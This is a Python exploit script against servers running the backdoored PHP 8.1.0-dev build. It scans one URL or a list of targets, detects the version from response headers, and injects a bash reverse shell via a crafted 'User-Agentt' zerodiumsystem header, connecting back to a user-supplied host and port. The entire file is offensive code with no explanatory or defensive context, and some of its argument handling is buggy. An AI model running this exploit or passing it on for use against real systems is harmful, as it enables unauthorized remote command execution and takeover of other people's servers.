import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument('--list', action='store', dest='list', required=False, help='Target list.')
parser.add_argument('--url', action='store', dest='url', required=False, help='Target url.')
parser.add_argument('--lhost', action='store', dest='lhost', required=False, help='Local host.')
parser.add_argument('--lport', action='store', dest='lport', required=False, help='Local port.')
arguments = parser.parse_args()
targets = []
lhosts = []
lports = []

def doRequest(url):
    return requests.get(url)

def check_target(request):
    for header in request.headers.items():
        if "PHP/8.1.0-dev" in header[1]:
            return True
    return False

def Reverse_Shell(url, lhost, lport):
    bash_payload = 'bash -c \"bash -i >& /dev/tcp/' + arguments.lhost + '/' + arguments.lport + ' 0>&1\"'
    inject_payload = requests.get(url, headers={"User-Agentt": "zerodiumsystem('" + bash_payload + "');"}, allow_redirects = False)

def main(targets):
    for target in targets:
        print("\n[+] Target: " + target)
        check = check_target(doRequest(target))
        if check == True:
            print('[+] Vulnerable! ' + target)
            try:
                Reverse_Shell(target, lhosts, lports)
            except:
                print('[!] Failed Reverse-shell :( ')
        else:
            print('[!] Not vulnerable ' + target)

if(arguments.url != None and arguments.list == None):
    targets.append(arguments.url)
    main(targets)

elif(arguments.url != None and arguments.lhost != None and arguments.lport != None):
    targets.append(arguments.url)
    lhosts.append(arguments.lhost)
    lports.append(arguments.lport)    
    Reverse_Shell(targets, lhosts, lports)

elif(arguments.url != None and arguments.list != None):
    print('You are lost? Look at help bro!!!')
    exit()

else:
    try:
        target_list = open(arguments.list, 'r', errors='ignore')
        for target in target_list.read().splitlines():
            targets.append(target)
        main(targets)

    except FileNotFoundError:
        print('[-] File with url not found.')
        exit()
